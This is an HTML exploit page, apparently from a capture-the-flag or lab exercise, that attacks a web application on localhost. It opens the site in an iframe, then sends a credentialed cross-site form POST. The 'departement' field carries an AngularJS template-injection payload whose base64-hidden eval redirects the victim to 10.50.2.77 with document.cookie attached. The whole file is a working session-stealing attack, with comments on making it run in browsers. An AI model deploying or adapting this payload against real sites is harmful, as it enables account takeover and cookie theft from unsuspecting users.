<!DOCTYPE HTML>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
</head>
<body>
    <!-- first we have to open an iframe to get a cookie and set has_visit to true -->
    <iframe id="iframe" src="https://localhost/"></iframe>
    <script>
        $("iframe").ready(function() {
            const formData = new URLSearchParams();
            formData.append('email', 'a@a.fr');
            formData.append('nom', 'a');
            formData.append('prenom', 'a');
            formData.append('departement', '{{constructor.constructor("eval(atob(\'d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHA6Ly8xMC41MC4yLjc3OjMwMDAyLz9kYXRhPScrYnRvYShkb2N1bWVudC5jb29raWUp\'))")()}}');
            fetch("https://localhost/submit-form", {
            method: "POST",
            redirect: "manual", //fetch follow 302 redirects, must be set to manual to execute the XSS
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: formData,
            credentials: "include" //include is required here for firefox/chrome/... to send the cookie
            })
            .then(response => {
                document.location.href = "https://localhost/";
            })
            .catch(error => {
                console.error('There was a problem with the fetch operation:', error);
            });
        });
    </script>
</body>
</html>